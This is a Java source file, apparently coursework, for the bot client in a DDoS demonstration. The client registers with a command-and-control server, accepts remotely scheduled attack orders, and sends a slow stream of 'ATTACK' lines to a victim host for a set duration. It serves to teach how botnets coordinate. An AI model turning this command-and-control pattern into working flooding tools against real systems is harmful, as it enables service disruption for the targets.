package eecs3214a2;

import eecs3214a2.common.*;
import java.io.*;
import java.net.*;
import java.text.*;
import java.util.*;
import java.util.concurrent.*;

/**
 * attacker client in the
 * Distributed Denial Of Service
 * attack demonstration.
 *
 * @author Vincent Chu
 * @version 1.0
 */
public class Attacker extends CommandLine implements Closeable {

    private static final Log L = Log.get();

    /**
     * Address of the command-and-control registrar server.
     * List of attacks.
     * Server for getting instructions from the command-and-control.
     * Client for attacking the victim server.
     * Handler for the attack scheduler.
     * System time delay, for time sync with command-and-control.
     * Server port to listen for instructions from command-and-control.
     */
    private final InetSocketAddress ccServerAddress;
    private final List<Attack> attacks = new ArrayList<>();
    private ServerService attackServer;
    private ScheduledFuture<?> scheduler;
    private long timeDelay = 0;
    private int serverPort;

    public Attacker(String ccHost, int ccPort) {
        ccServerAddress = new InetSocketAddress(ccHost, ccPort);
        add("start", "listen(int)");
        add("stop", "close");
        add("attack", "addAttack(String, int, String, long)");
        add("list", "listAttacks()");
        add("delay", "timeDelay()");
    }

    /**
     * Start listen for instructions from the
     * command-and-control system.
     *
     * @param port
     *      the port number of registrar
     * @throws IOException
     *      cannot acquire port
     */
    public void listen(Integer port) throws IOException {
        if (attackServer != null && !attackServer.isClosed()) {
            throw new IllegalStateException("Server already listening");
        }
        serverPort = port;
        attackServer = new ServerService();
        attackServer.listen(BotAgent.class, port, this);
        scheduler = Executors
                .newScheduledThreadPool(3)
                .scheduleAtFixedRate(new Scheduler(), 0, 1, TimeUnit.SECONDS);
        ClientService.send(
                ccServerAddress.getHostName(),
                ccServerAddress.getPort(),
                new RegistrarRequester(port, true));
    }

    /**
     * Adds an attack to the list of attacks
     * for scheduling to the attack the victims.
     *
     * @param host
     *      the victim host name
     * @param port
     *      the victim port number
     * @param dateTime
     *      the attack start date and time
     * @param duration
     *      the attack duration in milliseconds
     */
    public void addAttack(String host, Integer port,
                          String dateTime, Long duration) throws ParseException {
        final String format = "yyyy-MM-dd'T'HH:mm:ssz";
        SimpleDateFormat dateFormat = new SimpleDateFormat(format);
        long dateTimeInMillis = dateFormat.parse(dateTime).getTime();
        Attack attack = new Attack(host, port, dateTimeInMillis, duration * 1000);
        synchronized (attacks) {
            attacks.add(attack);
        }
    }

    /**
     * Lists all the attacks scheduled.
     */
    public void listAttacks() {
        synchronized (attacks) {
            for (Attack attack : attacks) {
                System.out.printf("Attack %s:%d at %d for %d%n",
                        attack.host,
                        attack.port,
                        attack.start,
                        attack.duration);
            }
        }
    }

    /**
     * Synchronize the clock with the
     * command-and-control server, disregarding
     * the networking delays.
     *
     * @param ccDateTime
     *      the command-and-control date-time
     *      in milliseconds
     */
    public void syncClock(Long ccDateTime) {
        timeDelay = ccDateTime - System.currentTimeMillis();
    }

    /**
     * Prints the time delay in the clock relative
     * to the command-and-control server, disregarding
     * the networking delays.
     */
    public void timeDelay() {
        System.out.printf("Time Delay %d%n", timeDelay);
    }

    /**
     * Returns the system time in milliseconds
     * offset for the delay in time to the
     * command-and-control server.
     */
    public long getCurrentTime() {
        return System.currentTimeMillis() + timeDelay;
    }

    @Override
    public void close() throws IOException {
        if (attackServer == null || attackServer.isClosed()) {
            throw new IllegalStateException("Server closed already");
        }
        attackServer.close();
        synchronized (attacks) {
            attacks.clear();
        }
        scheduler.cancel(true);
        ClientService.send(
                ccServerAddress.getHostName(),
                ccServerAddress.getPort(),
                new RegistrarRequester(serverPort, false));
    }

    // Subclasses

    /**
     * Simple data structure for holding the attack
     * instructions for each attack issued.
     */
    static class Attack {
        String host;    // Victim server hostname
        int port;       // Victim server port number
        long start;     // Start date-time to begin attack in ms
        long duration;  // Duration of the attack in ms

        public Attack(String host, int port, long start, long duration) {
            this.host = host;
            this.port = port;
            this.start = start;
            this.duration = duration;
        }
    } // Attack

    /**
     * Agent for a server to listen to incoming
     * commands from a command-and-control server.
     * Takes attack commands and schedules them
     * for attack at the appropriate datetime.
     */
    public class BotAgent implements Agent {
        @Override
        public boolean doAction(Map<String, Object> ctx,
                                String msg, PrintWriter out) throws IOException {
            if (msg == null) { return true; }
            CommandExecutor exec = (CommandExecutor)ctx.get("protocol");
            if (exec == null) {
                ctx.put("protocol", exec = new CommandExecutor()
                        .add("attack", "addAttack(String, int, String, long)")
                        .add("sync", "syncClock(long)"));
            }
            exec.execute(Attacker.this, msg);
            return false;
        }
    } // BotAgent

    /**
     * Cycles and every second checks for
     * new attacks and execute them at
     * the specifies the attack start time.
     */
    class Scheduler extends Thread {
        @Override
        public void run(){
            synchronized (attacks) {
                Iterator<Attack> itr = attacks.iterator();
                while (itr.hasNext()) {
                    Attack attack = itr.next();
                    if (attack.start <= getCurrentTime()) {
                        ClientService.send(attack.host, attack.port, new AttackRequester(attack));
                        itr.remove();
                    }
                }
            }
        }
    } // Scheduler

    /**
     * Agent factor for the agent that sends
     * requests to the victim server; performs
     * the attack on the target.
     */
    class AttackRequester extends Requester {
        AttackRequester(Attack attack) {
            put("attack", attack);
        }
        @Override
        public boolean doAction(Map<String, Object> ctx,
                                String msg, PrintWriter out) throws IOException {
            Attack attack = (Attack)mContext.get("attack");
            Integer count = (Integer)ctx.get("count");
            boolean stop = false;
            if (scheduler.isCancelled() || attack == null) {
                stop = true;
            } else {
                if (count == null) {
                    ctx.put("count", count = 0);
                } else {
                    try {
                        Thread.sleep(1000);
                    } catch (InterruptedException e) {
                        L.error(e);
                    }
                }
                if (getCurrentTime() >= attack.start + attack.duration) {
                    stop = true;
                }
            }
            if (stop) {
                out.println("\u0003");
                return false;
            }
            ctx.put("count", count += 1);
            out.printf("ATTACK %02d = %s:%d", count,
                    (String)ctx.get("LOCAL_HOST"),
                    (Integer)ctx.get("LOCAL_PORT"));
            out.println();
            return true;
        }
    } // AttackRequester

    /**
     * Agent that subscribes and cancels subscription
     * to the command-and-control registrar.
     */
    class RegistrarRequester extends SimpleRequester {
        RegistrarRequester(int port, boolean register) {
            put("port", port);
            put("register", register);
        }
        @Override
        protected String makeRequest(Map<String, Object> context) {
            String host = (String)context.get("LOCAL_HOST");
            Integer port = (Integer)context.get("port");
            boolean register = (boolean)mContext.get("register");
            return (register ? "SUBSCRIBE " : "CANCEL ") + host + " " + port;
        }
    } // RegistrarRequester

    // For Testing Purposes Only

    public static void main(String ...args) throws IOException {
        (new Attacker(args[0], Integer.parseInt(args[1]))).run();
    }

} // Attacker
